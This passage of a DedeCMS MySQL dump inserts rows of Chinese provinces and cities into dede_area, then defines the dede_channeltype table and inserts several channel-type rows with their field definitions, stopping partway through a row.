INSERT INTO dede_area VALUES ('813', '苏州市', '8', '0');
INSERT INTO dede_area VALUES ('9', '山东省', '0', '0');
INSERT INTO dede_area VALUES ('901', '济南市', '9', '0');
INSERT INTO dede_area VALUES ('902', '青岛市', '9', '0');
INSERT INTO dede_area VALUES ('903', '淄博市', '9', '0');
INSERT INTO dede_area VALUES ('904', '枣庄市', '9', '0');
INSERT INTO dede_area VALUES ('905', '东营市', '9', '0');
INSERT INTO dede_area VALUES ('906', '潍坊市', '9', '0');
INSERT INTO dede_area VALUES ('907', '烟台市', '9', '0');
INSERT INTO dede_area VALUES ('908', '威海市', '9', '0');
INSERT INTO dede_area VALUES ('909', '济宁市', '9', '0');
INSERT INTO dede_area VALUES ('910', '泰安市', '9', '0');
INSERT INTO dede_area VALUES ('911', '日照市', '9', '0');
INSERT INTO dede_area VALUES ('912', '莱芜市', '9', '0');
INSERT INTO dede_area VALUES ('913', '德州市', '9', '0');
INSERT INTO dede_area VALUES ('914', '临沂市', '9', '0');
INSERT INTO dede_area VALUES ('915', '聊城市', '9', '0');
INSERT INTO dede_area VALUES ('916', '滨州市', '9', '0');
INSERT INTO dede_area VALUES ('917', '菏泽市', '9', '0');
INSERT INTO dede_area VALUES ('10', '辽宁省', '0', '0');
INSERT INTO dede_area VALUES ('1001', '沈阳市', '10', '0');
INSERT INTO dede_area VALUES ('1002', '大连市', '10', '0');
INSERT INTO dede_area VALUES ('1003', '鞍山市', '10', '0');
INSERT INTO dede_area VALUES ('1004', '抚顺市', '10', '0');
INSERT INTO dede_area VALUES ('1005', '本溪市', '10', '0');
INSERT INTO dede_area VALUES ('1006', '丹东市', '10', '0');
INSERT INTO dede_area VALUES ('1007', '锦州市', '10', '0');
INSERT INTO dede_area VALUES ('1008', '葫芦岛市', '10', '0');
INSERT INTO dede_area VALUES ('1009', '营口市', '10', '0');
INSERT INTO dede_area VALUES ('1010', '盘锦市', '10', '0');
INSERT INTO dede_area VALUES ('1011', '阜新市', '10', '0');
INSERT INTO dede_area VALUES ('1012', '辽阳市', '10', '0');
INSERT INTO dede_area VALUES ('1013', '铁岭市', '10', '0');
INSERT INTO dede_area VALUES ('1014', '朝阳市', '10', '0');
INSERT INTO dede_area VALUES ('11', '江西省', '0', '0');
INSERT INTO dede_area VALUES ('1101', '南昌市', '11', '0');
INSERT INTO dede_area VALUES ('1102', '景德镇市', '11', '0');
INSERT INTO dede_area VALUES ('1103', '萍乡市', '11', '0');
INSERT INTO dede_area VALUES ('1104', '新余市', '11', '0');
INSERT INTO dede_area VALUES ('1105', '九江市', '11', '0');
INSERT INTO dede_area VALUES ('1106', '鹰潭市', '11', '0');
INSERT INTO dede_area VALUES ('1107', '赣州市', '11', '0');
INSERT INTO dede_area VALUES ('1108', '吉安市', '11', '0');
INSERT INTO dede_area VALUES ('1109', '宜春市', '11', '0');
INSERT INTO dede_area VALUES ('1110', '抚州市', '11', '0');
INSERT INTO dede_area VALUES ('1111', '上饶市', '11', '0');
INSERT INTO dede_area VALUES ('12', '四川省', '0', '0');
INSERT INTO dede_area VALUES ('1201', '成都市', '12', '0');
INSERT INTO dede_area VALUES ('1202', '自贡市', '12', '0');
INSERT INTO dede_area VALUES ('1203', '攀枝花市', '12', '0');
INSERT INTO dede_area VALUES ('1204', '泸州市', '12', '0');
INSERT INTO dede_area VALUES ('1205', '德阳市', '12', '0');
INSERT INTO dede_area VALUES ('1206', '绵阳市', '12', '0');
INSERT INTO dede_area VALUES ('1207', '广元市', '12', '0');
INSERT INTO dede_area VALUES ('1208', '遂宁市', '12', '0');
INSERT INTO dede_area VALUES ('1209', '内江市', '12', '0');
INSERT INTO dede_area VALUES ('1210', '乐山市', '12', '0');
INSERT INTO dede_area VALUES ('1211', '南充市', '12', '0');
INSERT INTO dede_area VALUES ('1212', '宜宾市', '12', '0');
INSERT INTO dede_area VALUES ('1213', '广安市', '12', '0');
INSERT INTO dede_area VALUES ('1214', '达州市', '12', '0');
INSERT INTO dede_area VALUES ('1215', '巴中市', '12', '0');
INSERT INTO dede_area VALUES ('1216', '雅安市', '12', '0');
INSERT INTO dede_area VALUES ('1217', '眉山市', '12', '0');
INSERT INTO dede_area VALUES ('1218', '资阳市', '12', '0');
INSERT INTO dede_area VALUES ('1219', '阿坝州', '12', '0');
INSERT INTO dede_area VALUES ('1220', '甘孜州', '12', '0');
INSERT INTO dede_area VALUES ('1221', '凉山州', '12', '0');
INSERT INTO dede_area VALUES ('13', '陕西省', '0', '0');
INSERT INTO dede_area VALUES ('3114', '西安市', '13', '0');
INSERT INTO dede_area VALUES ('1302', '铜川市', '13', '0');
INSERT INTO dede_area VALUES ('1303', '宝鸡市', '13', '0');
INSERT INTO dede_area VALUES ('1304', '咸阳市', '13', '0');
INSERT INTO dede_area VALUES ('1305', '渭南市', '13', '0');
INSERT INTO dede_area VALUES ('1306', '延安市', '13', '0');
INSERT INTO dede_area VALUES ('1307', '汉中市', '13', '0');
INSERT INTO dede_area VALUES ('1308', '榆林市', '13', '0');
INSERT INTO dede_area VALUES ('1309', '安康市', '13', '0');
INSERT INTO dede_area VALUES ('1310', '商洛地区', '13', '0');
INSERT INTO dede_area VALUES ('14', '湖北省', '0', '0');
INSERT INTO dede_area VALUES ('1401', '武汉市', '14', '0');
INSERT INTO dede_area VALUES ('1402', '黄石市', '14', '0');
INSERT INTO dede_area VALUES ('1403', '襄樊市', '14', '0');
INSERT INTO dede_area VALUES ('1404', '十堰市', '14', '0');
INSERT INTO dede_area VALUES ('1405', '荆州市', '14', '0');
INSERT INTO dede_area VALUES ('1406', '宜昌市', '14', '0');
INSERT INTO dede_area VALUES ('1407', '荆门市', '14', '0');
INSERT INTO dede_area VALUES ('1408', '鄂州市', '14', '0');
INSERT INTO dede_area VALUES ('1409', '孝感市', '14', '0');
INSERT INTO dede_area VALUES ('1410', '黄冈市', '14', '0');
INSERT INTO dede_area VALUES ('1411', '咸宁市', '14', '0');
INSERT INTO dede_area VALUES ('1412', '随州市', '14', '0');
INSERT INTO dede_area VALUES ('1413', '仙桃市', '14', '0');
INSERT INTO dede_area VALUES ('1414', '天门市', '14', '0');
INSERT INTO dede_area VALUES ('1415', '潜江市', '14', '0');
INSERT INTO dede_area VALUES ('1416', '神农架', '14', '0');
INSERT INTO dede_area VALUES ('1417', '恩施州', '14', '0');
INSERT INTO dede_area VALUES ('15', '河南省', '0', '0');
INSERT INTO dede_area VALUES ('1501', '郑州市', '15', '0');
INSERT INTO dede_area VALUES ('1502', '开封市', '15', '0');
INSERT INTO dede_area VALUES ('1503', '洛阳市', '15', '0');
INSERT INTO dede_area VALUES ('1504', '平顶山市', '15', '0');
INSERT INTO dede_area VALUES ('1505', '焦作市', '15', '0');
INSERT INTO dede_area VALUES ('1506', '鹤壁市', '15', '0');
INSERT INTO dede_area VALUES ('1507', '新乡市', '15', '0');
INSERT INTO dede_area VALUES ('1508', '安阳市', '15', '0');
INSERT INTO dede_area VALUES ('1509', '濮阳市', '15', '0');
INSERT INTO dede_area VALUES ('1510', '许昌市', '15', '0');
INSERT INTO dede_area VALUES ('1511', '漯河市', '15', '0');
INSERT INTO dede_area VALUES ('1512', '三门峡市', '15', '0');
INSERT INTO dede_area VALUES ('1513', '南阳市', '15', '0');
INSERT INTO dede_area VALUES ('1514', '商丘市', '15', '0');
INSERT INTO dede_area VALUES ('1515', '信阳市', '15', '0');
INSERT INTO dede_area VALUES ('1516', '周口市', '15', '0');
INSERT INTO dede_area VALUES ('1517', '驻马店市', '15', '0');
INSERT INTO dede_area VALUES ('1518', '济源市', '15', '0');
INSERT INTO dede_area VALUES ('16', '河北省', '0', '0');
INSERT INTO dede_area VALUES ('1601', '石家庄市', '16', '0');
INSERT INTO dede_area VALUES ('1602', '唐山市', '16', '0');
INSERT INTO dede_area VALUES ('1603', '秦皇岛市', '16', '0');
INSERT INTO dede_area VALUES ('1604', '邯郸市', '16', '0');
INSERT INTO dede_area VALUES ('1605', '邢台市', '16', '0');
INSERT INTO dede_area VALUES ('1606', '保定市', '16', '0');
INSERT INTO dede_area VALUES ('1607', '张家口市', '16', '0');
INSERT INTO dede_area VALUES ('1608', '承德市', '16', '0');
INSERT INTO dede_area VALUES ('1609', '沧州市', '16', '0');
INSERT INTO dede_area VALUES ('1610', '廊坊市', '16', '0');
INSERT INTO dede_area VALUES ('1611', '衡水市', '16', '0');
INSERT INTO dede_area VALUES ('17', '山西省', '0', '0');
INSERT INTO dede_area VALUES ('1701', '太原市', '17', '0');
INSERT INTO dede_area VALUES ('1702', '大同市', '17', '0');
INSERT INTO dede_area VALUES ('1703', '阳泉市', '17', '0');
INSERT INTO dede_area VALUES ('1704', '长治市', '17', '0');
INSERT INTO dede_area VALUES ('1705', '晋城市', '17', '0');
INSERT INTO dede_area VALUES ('1706', '朔州市', '17', '0');
INSERT INTO dede_area VALUES ('1707', '晋中市', '17', '0');
INSERT INTO dede_area VALUES ('1708', '忻州市', '17', '0');
INSERT INTO dede_area VALUES ('1709', '临汾市', '17', '0');
INSERT INTO dede_area VALUES ('1710', '运城市', '17', '0');
INSERT INTO dede_area VALUES ('1711', '吕梁地区', '17', '0');
INSERT INTO dede_area VALUES ('18', '内蒙古', '0', '0');
INSERT INTO dede_area VALUES ('1801', '呼和浩特', '18', '0');
INSERT INTO dede_area VALUES ('1802', '包头市', '18', '0');
INSERT INTO dede_area VALUES ('1803', '乌海市', '18', '0');
INSERT INTO dede_area VALUES ('1804', '赤峰市', '18', '0');
INSERT INTO dede_area VALUES ('1805', '通辽市', '18', '0');
INSERT INTO dede_area VALUES ('1806', '鄂尔多斯', '18', '0');
INSERT INTO dede_area VALUES ('1807', '乌兰察布', '18', '0');
INSERT INTO dede_area VALUES ('1808', '锡林郭勒', '18', '0');
INSERT INTO dede_area VALUES ('1809', '呼伦贝尔', '18', '0');
INSERT INTO dede_area VALUES ('1810', '巴彦淖尔', '18', '0');
INSERT INTO dede_area VALUES ('1811', '阿拉善盟', '18', '0');
INSERT INTO dede_area VALUES ('1812', '兴安盟', '18', '0');
INSERT INTO dede_area VALUES ('19', '吉林省', '0', '0');
INSERT INTO dede_area VALUES ('1901', '长春市', '19', '0');
INSERT INTO dede_area VALUES ('1902', '吉林市', '19', '0');
INSERT INTO dede_area VALUES ('1903', '四平市', '19', '0');
INSERT INTO dede_area VALUES ('1904', '辽源市', '19', '0');
INSERT INTO dede_area VALUES ('1905', '通化市', '19', '0');
INSERT INTO dede_area VALUES ('1906', '白山市', '19', '0');
INSERT INTO dede_area VALUES ('1907', '松原市', '19', '0');
INSERT INTO dede_area VALUES ('1908', '白城市', '19', '0');
INSERT INTO dede_area VALUES ('1909', '延边州', '19', '0');
INSERT INTO dede_area VALUES ('20', '黑龙江', '0', '0');
INSERT INTO dede_area VALUES ('2001', '哈尔滨市', '20', '0');
INSERT INTO dede_area VALUES ('2002', '齐齐哈尔', '20', '0');
INSERT INTO dede_area VALUES ('2003', '鹤岗市', '20', '0');
INSERT INTO dede_area VALUES ('2004', '双鸭山市', '20', '0');
INSERT INTO dede_area VALUES ('2005', '鸡西市', '20', '0');
INSERT INTO dede_area VALUES ('2006', '大庆市', '20', '0');
INSERT INTO dede_area VALUES ('2007', '伊春市', '20', '0');
INSERT INTO dede_area VALUES ('2008', '牡丹江市', '20', '0');
INSERT INTO dede_area VALUES ('2009', '佳木斯市', '20', '0');
INSERT INTO dede_area VALUES ('2010', '七台河市', '20', '0');
INSERT INTO dede_area VALUES ('2011', '黑河市', '20', '0');
INSERT INTO dede_area VALUES ('2012', '绥化市', '20', '0');
INSERT INTO dede_area VALUES ('2013', '大兴安岭', '20', '0');
INSERT INTO dede_area VALUES ('21', '安徽省', '0', '0');
INSERT INTO dede_area VALUES ('2101', '合肥市', '21', '0');
INSERT INTO dede_area VALUES ('2102', '芜湖市', '21', '0');
INSERT INTO dede_area VALUES ('2103', '蚌埠市', '21', '0');
INSERT INTO dede_area VALUES ('2104', '淮南市', '21', '0');
INSERT INTO dede_area VALUES ('2105', '马鞍山市', '21', '0');
INSERT INTO dede_area VALUES ('2106', '淮北市', '21', '0');
INSERT INTO dede_area VALUES ('2107', '铜陵市', '21', '0');
INSERT INTO dede_area VALUES ('2108', '安庆市', '21', '0');
INSERT INTO dede_area VALUES ('2109', '黄山市', '21', '0');
INSERT INTO dede_area VALUES ('2110', '滁州市', '21', '0');
INSERT INTO dede_area VALUES ('2111', '阜阳市', '21', '0');
INSERT INTO dede_area VALUES ('2112', '宿州市', '21', '0');
INSERT INTO dede_area VALUES ('2113', '巢湖市', '21', '0');
INSERT INTO dede_area VALUES ('2114', '六安市', '21', '0');
INSERT INTO dede_area VALUES ('2115', '亳州市', '21', '0');
INSERT INTO dede_area VALUES ('2116', '宣城市', '21', '0');
INSERT INTO dede_area VALUES ('2117', '池州市', '21', '0');
INSERT INTO dede_area VALUES ('22', '湖南省', '0', '0');
INSERT INTO dede_area VALUES ('2201', '长沙市', '22', '0');
INSERT INTO dede_area VALUES ('2202', '株州市', '22', '0');
INSERT INTO dede_area VALUES ('2203', '湘潭市', '22', '0');
INSERT INTO dede_area VALUES ('2204', '衡阳市', '22', '0');
INSERT INTO dede_area VALUES ('2205', '邵阳市', '22', '0');
INSERT INTO dede_area VALUES ('2206', '岳阳市', '22', '0');
INSERT INTO dede_area VALUES ('2207', '常德市', '22', '0');
INSERT INTO dede_area VALUES ('2208', '张家界市', '22', '0');
INSERT INTO dede_area VALUES ('2209', '益阳市', '22', '0');
INSERT INTO dede_area VALUES ('2210', '郴州市', '22', '0');
INSERT INTO dede_area VALUES ('2211', '永州市', '22', '0');
INSERT INTO dede_area VALUES ('2212', '怀化市', '22', '0');
INSERT INTO dede_area VALUES ('2213', '娄底市', '22', '0');
INSERT INTO dede_area VALUES ('2214', '湘西州', '22', '0');
INSERT INTO dede_area VALUES ('23', '广西区', '0', '0');
INSERT INTO dede_area VALUES ('2301', '南宁市', '23', '0');
INSERT INTO dede_area VALUES ('2302', '柳州市', '23', '0');
INSERT INTO dede_area VALUES ('2303', '桂林市', '23', '0');
INSERT INTO dede_area VALUES ('2304', '梧州市', '23', '0');
INSERT INTO dede_area VALUES ('2305', '北海市', '23', '0');
INSERT INTO dede_area VALUES ('2306', '防城港市', '23', '0');
INSERT INTO dede_area VALUES ('2307', '钦州市', '23', '0');
INSERT INTO dede_area VALUES ('2308', '贵港市', '23', '0');
INSERT INTO dede_area VALUES ('2309', '玉林市', '23', '0');
INSERT INTO dede_area VALUES ('2310', '南宁地区', '23', '0');
INSERT INTO dede_area VALUES ('2311', '柳州地区', '23', '0');
INSERT INTO dede_area VALUES ('2312', '贺州地区', '23', '0');
INSERT INTO dede_area VALUES ('2313', '百色地区', '23', '0');
INSERT INTO dede_area VALUES ('2314', '河池地区', '23', '0');
INSERT INTO dede_area VALUES ('24', '海南省', '0', '0');
INSERT INTO dede_area VALUES ('2401', '海口市', '24', '0');
INSERT INTO dede_area VALUES ('2402', '三亚市', '24', '0');
INSERT INTO dede_area VALUES ('2403', '五指山市', '24', '0');
INSERT INTO dede_area VALUES ('2404', '琼海市', '24', '0');
INSERT INTO dede_area VALUES ('2405', '儋州市', '24', '0');
INSERT INTO dede_area VALUES ('2406', '琼山市', '24', '0');
INSERT INTO dede_area VALUES ('2407', '文昌市', '24', '0');
INSERT INTO dede_area VALUES ('2408', '万宁市', '24', '0');
INSERT INTO dede_area VALUES ('2409', '东方市', '24', '0');
INSERT INTO dede_area VALUES ('2410', '澄迈县', '24', '0');
INSERT INTO dede_area VALUES ('2411', '定安县', '24', '0');
INSERT INTO dede_area VALUES ('2412', '屯昌县', '24', '0');
INSERT INTO dede_area VALUES ('2413', '临高县', '24', '0');
INSERT INTO dede_area VALUES ('2414', '白沙县', '24', '0');
INSERT INTO dede_area VALUES ('2415', '昌江县', '24', '0');
INSERT INTO dede_area VALUES ('2416', '乐东县', '24', '0');
INSERT INTO dede_area VALUES ('2417', '陵水县', '24', '0');
INSERT INTO dede_area VALUES ('2418', '保亭县', '24', '0');
INSERT INTO dede_area VALUES ('2419', '琼中县', '24', '0');
INSERT INTO dede_area VALUES ('25', '云南省', '0', '0');
INSERT INTO dede_area VALUES ('2501', '昆明市', '25', '0');
INSERT INTO dede_area VALUES ('2502', '曲靖市', '25', '0');
INSERT INTO dede_area VALUES ('2503', '玉溪市', '25', '0');
INSERT INTO dede_area VALUES ('2504', '保山市', '25', '0');
INSERT INTO dede_area VALUES ('2505', '昭通市', '25', '0');
INSERT INTO dede_area VALUES ('2506', '思茅地区', '25', '0');
INSERT INTO dede_area VALUES ('2507', '临沧地区', '25', '0');
INSERT INTO dede_area VALUES ('2508', '丽江地区', '25', '0');
INSERT INTO dede_area VALUES ('2509', '文山州', '25', '0');
INSERT INTO dede_area VALUES ('2510', '红河州', '25', '0');
INSERT INTO dede_area VALUES ('2511', '西双版纳', '25', '0');
INSERT INTO dede_area VALUES ('2512', '楚雄州', '25', '0');
INSERT INTO dede_area VALUES ('2513', '大理州', '25', '0');
INSERT INTO dede_area VALUES ('2514', '德宏州', '25', '0');
INSERT INTO dede_area VALUES ('2515', '怒江州', '25', '0');
INSERT INTO dede_area VALUES ('2516', '迪庆州', '25', '0');
INSERT INTO dede_area VALUES ('26', '贵州省', '0', '0');
INSERT INTO dede_area VALUES ('2601', '贵阳市', '26', '0');
INSERT INTO dede_area VALUES ('2602', '六盘水市', '26', '0');
INSERT INTO dede_area VALUES ('2603', '遵义市', '26', '0');
INSERT INTO dede_area VALUES ('2604', '安顺市', '26', '0');
INSERT INTO dede_area VALUES ('2605', '铜仁地区', '26', '0');
INSERT INTO dede_area VALUES ('2606', '毕节地区', '26', '0');
INSERT INTO dede_area VALUES ('2607', '黔西南州', '26', '0');
INSERT INTO dede_area VALUES ('2608', '黔东南州', '26', '0');
INSERT INTO dede_area VALUES ('2609', '黔南州', '26', '0');
INSERT INTO dede_area VALUES ('27', '西藏区', '0', '0');
INSERT INTO dede_area VALUES ('2701', '拉萨市', '27', '0');
INSERT INTO dede_area VALUES ('2702', '那曲地区', '27', '0');
INSERT INTO dede_area VALUES ('2703', '昌都地区', '27', '0');
INSERT INTO dede_area VALUES ('2704', '山南地区', '27', '0');
INSERT INTO dede_area VALUES ('2705', '日喀则', '27', '0');
INSERT INTO dede_area VALUES ('2706', '阿里地区', '27', '0');
INSERT INTO dede_area VALUES ('2707', '林芝地区', '27', '0');
INSERT INTO dede_area VALUES ('28', '甘肃省', '0', '0');
INSERT INTO dede_area VALUES ('2801', '兰州市', '28', '0');
INSERT INTO dede_area VALUES ('2802', '金昌市', '28', '0');
INSERT INTO dede_area VALUES ('2803', '白银市', '28', '0');
INSERT INTO dede_area VALUES ('2804', '天水市', '28', '0');
INSERT INTO dede_area VALUES ('2805', '嘉峪关市', '28', '0');
INSERT INTO dede_area VALUES ('2806', '武威市', '28', '0');
INSERT INTO dede_area VALUES ('2807', '定西地区', '28', '0');
INSERT INTO dede_area VALUES ('2808', '平凉地区', '28', '0');
INSERT INTO dede_area VALUES ('2809', '庆阳地区', '28', '0');
INSERT INTO dede_area VALUES ('2810', '陇南地区', '28', '0');
INSERT INTO dede_area VALUES ('2811', '张掖地区', '28', '0');
INSERT INTO dede_area VALUES ('2812', '酒泉地区', '28', '0');
INSERT INTO dede_area VALUES ('2813', '甘南州', '28', '0');
INSERT INTO dede_area VALUES ('2814', '临夏州', '28', '0');
INSERT INTO dede_area VALUES ('29', '宁夏区', '0', '0');
INSERT INTO dede_area VALUES ('2901', '银川市', '29', '0');
INSERT INTO dede_area VALUES ('2902', '石嘴山市', '29', '0');
INSERT INTO dede_area VALUES ('2903', '吴忠市', '29', '0');
INSERT INTO dede_area VALUES ('2904', '固原市', '29', '0');
INSERT INTO dede_area VALUES ('30', '青海省', '0', '0');
INSERT INTO dede_area VALUES ('3001', '西宁市', '30', '0');
INSERT INTO dede_area VALUES ('3002', '海东地区', '30', '0');
INSERT INTO dede_area VALUES ('3003', '海北州', '30', '0');
INSERT INTO dede_area VALUES ('3004', '黄南州', '30', '0');
INSERT INTO dede_area VALUES ('3005', '海南州', '30', '0');
INSERT INTO dede_area VALUES ('3006', '果洛州', '30', '0');
INSERT INTO dede_area VALUES ('3007', '玉树州', '30', '0');
INSERT INTO dede_area VALUES ('3008', '海西州', '30', '0');
INSERT INTO dede_area VALUES ('31', '新疆区', '0', '0');
INSERT INTO dede_area VALUES ('3101', '乌鲁木齐', '31', '0');
INSERT INTO dede_area VALUES ('3102', '克拉玛依', '31', '0');
INSERT INTO dede_area VALUES ('3103', '石河子市', '31', '0');
INSERT INTO dede_area VALUES ('3104', '吐鲁番', '31', '0');
INSERT INTO dede_area VALUES ('3105', '哈密地区', '31', '0');
INSERT INTO dede_area VALUES ('3106', '和田地区', '31', '0');
INSERT INTO dede_area VALUES ('3107', '阿克苏', '31', '0');
INSERT INTO dede_area VALUES ('3108', '喀什地区', '31', '0');
INSERT INTO dede_area VALUES ('3109', '克孜勒苏', '31', '0');
INSERT INTO dede_area VALUES ('3110', '巴音郭楞', '31', '0');
INSERT INTO dede_area VALUES ('3111', '昌吉州', '31', '0');
INSERT INTO dede_area VALUES ('3112', '博尔塔拉', '31', '0');
INSERT INTO dede_area VALUES ('3113', '伊犁州', '31', '0');
INSERT INTO dede_area VALUES ('3117', '东城区', '1', '0');
INSERT INTO dede_area VALUES ('32', '香港区', '0', '0');
INSERT INTO dede_area VALUES ('33', '澳门区', '0', '0');
INSERT INTO dede_area VALUES ('35', '台湾省', '0', '0');

-- ----------------------------
-- Table structure for `dede_channeltype`
-- ----------------------------
DROP TABLE IF EXISTS `dede_channeltype`;
CREATE TABLE `dede_channeltype` (
  `id` smallint(6) NOT NULL DEFAULT '0',
  `nid` varchar(20) NOT NULL DEFAULT '',
  `typename` varchar(30) NOT NULL DEFAULT '',
  `maintable` varchar(50) NOT NULL DEFAULT 'dede_archives',
  `addtable` varchar(50) NOT NULL DEFAULT '',
  `addcon` varchar(30) NOT NULL DEFAULT '',
  `mancon` varchar(30) NOT NULL DEFAULT '',
  `editcon` varchar(30) NOT NULL DEFAULT '',
  `useraddcon` varchar(30) NOT NULL DEFAULT '',
  `usermancon` varchar(30) NOT NULL DEFAULT '',
  `usereditcon` varchar(30) NOT NULL DEFAULT '',
  `fieldset` text,
  `listfields` text,
  `allfields` text,
  `issystem` smallint(6) NOT NULL DEFAULT '0',
  `isshow` smallint(6) NOT NULL DEFAULT '1',
  `issend` smallint(6) NOT NULL DEFAULT '0',
  `arcsta` smallint(6) NOT NULL DEFAULT '-1',
  `usertype` char(10) NOT NULL DEFAULT '',
  `sendrank` smallint(6) NOT NULL DEFAULT '10',
  `isdefault` smallint(6) NOT NULL DEFAULT '0',
  `needdes` tinyint(1) NOT NULL DEFAULT '1',
  `needpic` tinyint(1) NOT NULL DEFAULT '1',
  `titlename` varchar(20) NOT NULL DEFAULT '标题',
  `onlyone` smallint(6) NOT NULL DEFAULT '0',
  `dfcid` smallint(5) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `nid` (`nid`,`isshow`,`arcsta`,`sendrank`) USING BTREE
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_channeltype
-- ----------------------------
INSERT INTO dede_channeltype VALUES ('1', 'article', '普通文章', 'dede_archives', 'dede_addonarticle', 'article_add.php', 'content_list.php', 'article_edit.php', 'article_add.php', 'content_list.php', 'article_edit.php', '<field:body itemname=\"文章内容\" autofield=\"0\" notsend=\"0\" type=\"htmltext\" isnull=\"true\" islist=\"1\" default=\"\"  maxlength=\"\" page=\"split\">	\n</field:body>	\n', '', '', '1', '1', '1', '-1', '', '10', '0', '1', '1', '标题', '0', '0');
INSERT INTO dede_channeltype VALUES ('2', 'image', '图片集', 'dede_archives', 'dede_addonimages', 'album_add.php', 'content_i_list.php', 'album_edit.php', 'album_add.php', 'content_list.php', 'album_edit.php', '<field:pagestyle itemname=\"页面风格\" type=\"number\" isnull=\"true\" default=\"2\" rename=\"\" notsend=\"1\" />	\n<field:imgurls itemname=\"图片集合\" type=\"img\" isnull=\"true\" default=\"\" rename=\"\" page=\"split\"/>	\n<field:body itemname=\"图集内容\" autofield=\"0\" notsend=\"0\" type=\"htmltext\" isnull=\"true\" islist=\"0\" default=\"\"  maxlength=\"250\" page=\"\"></field:body>', '', '', '1', '1', '1', '-1', '', '10', '0', '1', '1', '标题', '0', '0');
INSERT INTO dede_channeltype VALUES ('3', 'soft', '软件', 'dede_archives', 'dede_addonsoft', 'soft_add.php', 'content_i_list.php', 'soft_edit.php', '', '', '', '<field:filetype islist=\"1\" itemname=\"文件类型\" type=\"text\" isnull=\"true\" default=\"\" rename=\"\" />	\n<field:language islist=\"1\" itemname=\"语言\" type=\"text\" isnull=\"true\" default=\"\" rename=\"\" />	\n<field:softtype islist=\"1\" itemname=\"软件类型\" type=\"text\" isnull=\"true\" default=\"\" rename=\"\" />	\n<field:accredit islist=\"1\" itemname=\"授权方式\" type=\"text\" isnull=\"true\" default=\"\" rename=\"\" />	\n<field:os islist=\"1\" itemname=\"操作系统\" type=\"text\" isnull=\"true\" default=\"\" rename=\"\" />	\n<field:softrank  islist=\"1\" itemname=\"软件等级\" type=\"int\" isnull=\"true\" default=\"3\" rename=\"\" function=\"GetRankStar(@me)\" notsend=\"1\"/>	\n<field:officialUrl  itemname=\"官方网址\" type=\"text\" isnull=\"true\" default=\"\" rename=\"\" />	\n<field:officialDemo itemname=\"演示网址\" type=\"text\" isnull=\"true\" default=\"\" rename=\"\" />	\n<field:softsize  itemname=\"软件大小\" type=\"text\" isnull=\"true\" default=\"\" rename=\"\" />	\n<field:softlinks  itemname=\"软件地址\" type=\"softlinks\" isnull=\"true\" default=\"\" rename=\"\" />	\n<field:introduce  itemname=\"详细介绍\" type=\"htmltext\" isnull=\"trnue\" default=\"\" rename=\"\" />	\n<field:daccess islist=\"1\" itemname=\"下载级别\" type=\"int\" isnull=\"true\" default=\"0\" rename=\"\" function=\"\" notsend=\"1\"/>	\n<field:needmoney islist=\"1\" itemname=\"需要金币\" type=\"int\" isnull=\"true\" default=\"0\" rename=\"\" function=\"\" notsend=\"1\" />', 'filetype,language,softtype,os,accredit,softrank', '', '1', '1', '1', '-1', '', '10', '0', '1', '1', '标题', '0', '0');
INSERT INTO dede_channeltype VALUES ('-1', 'spec', '专题', 'dede_archives', 'dede_addonspec', 'spec_add.php', 'content_s_list.php', 'spec_edit.php', '', '', '', '<field:note type=\"specialtopic\" isnull=\"true\" default=\"\" rename=\"\"/>', '', '', '1', '1', '0', '-1', '', '10', '0', '1', '1', '标题', '0', '0');
INSERT INTO dede_channeltype VALUES ('6', 'shop', '商品', 'dede_archives', 'dede_addonshop', 'archives_add.php', 'content_list.php', 'archives_edit.php', 'archives_add.php', 'content_list.php', 'archives_edit.php', '<field:body itemname=\"详细介绍\" autofield=\"1\" notsend=\"0\" type=\"htmltext\" isnull=\"true\" islist=\"0\" default=\"\"  maxlength=\"\" page=\"split\">	\n</field:body>	\n<field:price itemname=\"市场价\" autofield=\"1\" notsend=\"0\" type=\"float\" isnull=\"true\" islist=\"1\" default=\"\"  maxlength=\"\" page=\"\">	\n</field:price>	\n<field:trueprice itemname=\"优惠价\" autofield=\"1\" notsend=\"0\" type=\"float\" isnull=\"true\" islist=\"1\" default=\"\"  maxlength=\"\" page=\"\">	\n</field:trueprice>	\n<field:brand itemname=\"品牌\" autofield=\"1\" notsend=\"0\" type=\"text\" isnull=\"true\" islist=\"1\" default=\"\"  maxlength=\"250\" page=\"\">	\n</field:brand>	\n<field:units itemname=\"计量单位\" autofield=\"1\" notsend=\"0\" type=\"text\" isnull=\"true\" islist=\"1\" default=\"\"  maxlength=\"250\" page=\"\">	\n</field:units>	\n\n	\n\n<field:vocation itemname=\"行业\" autofield=\"1\" notsend=\"0\"type=\"stepselect\" isnull=\"true\" islist=\"0\" default=\"\"  maxlength=\"250\" page=\"\">	\n</field:vocation>	\n\n<field:infotype itemname=\"信息类型\" autofield=\"1\" notsend=\"0\" type=\"stepselect\" isnull=\"true\" islist=\"0\" default=\"\"  maxlength=\"250\" page=\"\">	\n</field:infotype>	\n\n<field:uptime itemname=\"上架时间\" autofield=\"1\" notsend=\"0\" type=\"datetime\" isnull=\"true\" islist=\"0\" default=\"\"  maxlength=\"250\" page=\"\">	\n</field:uptime>	\n', 'price,trueprice,brand,units', '', '0', '1', '1', '-1', '', '10', '0', '1', '1', '商品名称', '0', '0');
INSERT INTO dede_channeltype VALUES ('-8', 'infos', '分类信息', 'dede_archives', 'dede_addoninfos', 'archives_sg_add.php', 'content_sg_list.php', 'archives_sg_edit.php', 'archives_sg_add.php', 'content_sg_list.php', 'archives_sg_edit.php', '<field:channel itemname=\"频道id\" autofield=\"0\" notsend=\"0\" type=\"int\" isnull=\"true\" islist=\"1\" default=\"0\"  maxlength=\"10\" page=\"\"></field:channel>	\n<field:arcrank itemname=\"浏览权限\" autofield=\"0\" notsend=\"0\" type=\"int\" isnull=\"true\" islist=\"1\" default=\"0\"  maxlength=\"5\" page=\"\"></field:arcrank>	\n<field:mid itemname=\"会员id\" autofield=\"0\" notsend=\"0\" type=\"int\" isnull=\"true\" islist=\"1\" default=\"0\"  maxlength=\"8\" page=\"\"></field:mid>	\n<field:click itemname=\"点击\" autofield=\"0\" notsend=\"0\" type=\"int\" isnull=\"true\" islist=\"1\" default=\"0\"  maxlength=\"10\" page=\"\"></field:click>	\n<field:title itemname=\"标题\" autofield=\"0\" notsend=\"0\" type=\"text\" isnull=\"true\" islist=\"1\" default=\"0\"  maxlength=\"60\" page=\"\"></field:title>	\n<field:senddate itemname=\"发布时间\" autofield=\"0\" notsend=\"0\" type=\"int\" isnull=\"true\" 